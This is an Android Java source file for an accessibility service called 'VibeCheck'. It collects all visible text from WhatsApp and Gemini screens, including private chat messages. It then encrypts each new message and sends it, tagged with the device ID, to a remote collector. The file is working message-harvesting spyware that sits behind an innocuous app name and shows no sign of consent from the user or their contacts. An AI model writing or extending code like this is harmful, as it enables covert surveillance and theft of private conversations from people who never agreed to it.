package app.lovable.cb70405bb9cf47f6aac54784c26796c4.services;

import android.accessibilityservice.AccessibilityService;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;

import app.lovable.cb70405bb9cf47f6aac54784c26796c4.utils.AESEncryptor;
import app.lovable.cb70405bb9cf47f6aac54784c26796c4.utils.MessageSender;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

public class VibeCheckAccessibilityService extends AccessibilityService {

    private static final String TAG = "VibeCheckA11y";
    private static final String WHATSAPP_PKG = "com.whatsapp";
    private static final String GEMINI_PKG = "com.google.android.googlequicksearchbox";

    // LRU cache for dedup — auto-evicts oldest entries
    private static final int MAX_CACHE_SIZE = 1000;
    private final LinkedHashMap<String, Boolean> recentMessages =
        new LinkedHashMap<String, Boolean>(MAX_CACHE_SIZE + 1, 0.75f, true) {
            @Override
            protected boolean removeEldestEntry(Map.Entry<String, Boolean> eldest) {
                return size() > MAX_CACHE_SIZE;
            }
        };

    // Throttle: minimum ms between processing events from the same package
    private static final long EVENT_THROTTLE_MS = 1500;
    private long lastProcessedTime = 0;

    // Minimum message length to filter out UI labels/buttons
    private static final int MIN_MSG_LENGTH = 3;

    private String deviceId;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        Log.d(TAG, "Accessibility service connected, device: " + deviceId);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        CharSequence pkgName = event.getPackageName();
        if (pkgName == null) return;

        String pkg = pkgName.toString();
        if (!pkg.equals(WHATSAPP_PKG) && !pkg.equals(GEMINI_PKG)) return;

        int eventType = event.getEventType();
        if (eventType != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED &&
            eventType != AccessibilityEvent.TYPE_VIEW_SCROLLED) return;

        // Throttle: skip if we processed too recently
        long now = System.currentTimeMillis();
        if (now - lastProcessedTime < EVENT_THROTTLE_MS) return;
        lastProcessedTime = now;

        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;

        try {
            // Collect all visible text in one pass, then build a snapshot
            List<String> currentTexts = new ArrayList<>();
            collectTexts(rootNode, currentTexts, pkg);

            // Send only new, unseen texts
            for (String text : currentTexts) {
                if (!recentMessages.containsKey(text)) {
                    recentMessages.put(text, true);
                    Log.d(TAG, "NEW MSG [" + pkg + "]: " + text.substring(0, Math.min(text.length(), 50)));
                    sendEncrypted(text, pkg);
                }
            }
        } finally {
            rootNode.recycle();
        }
    }

    private void collectTexts(AccessibilityNodeInfo node, List<String> out, String pkg) {
        if (node == null) return;

        CharSequence text = node.getText();
        if (text != null) {
            String msg = text.toString().trim();
            // Filter: long enough to be real content, not a button/label
            if (msg.length() >= MIN_MSG_LENGTH && !isUiBoilerplate(msg)) {
                out.add(msg);
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                try {
                    collectTexts(child, out, pkg);
                } finally {
                    child.recycle();
                }
            }
        }
    }

    /** Filter out common UI strings that aren't actual chat messages */
    private boolean isUiBoilerplate(String msg) {
        String lower = msg.toLowerCase();
        return lower.equals("type a message")
            || lower.equals("message")
            || lower.startsWith("tap to ")
            || lower.startsWith("double tap to ")
            || lower.equals("send")
            || lower.equals("back")
            || lower.equals("more options")
            || lower.equals("search")
            || lower.contains("your organization's chats aren't used");
    }

    private void sendEncrypted(String message, String pkg) {
        try {
            String appName = pkg.equals(WHATSAPP_PKG) ? "whatsapp" : "gemini";
            String[] result = AESEncryptor.encrypt(message);
            MessageSender.send(this, deviceId, appName, result[0], result[1], System.currentTimeMillis());
            Log.d(TAG, "Sent encrypted message from " + appName);
        } catch (Exception e) {
            Log.e(TAG, "Encryption/send failed", e);
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted");
    }
}
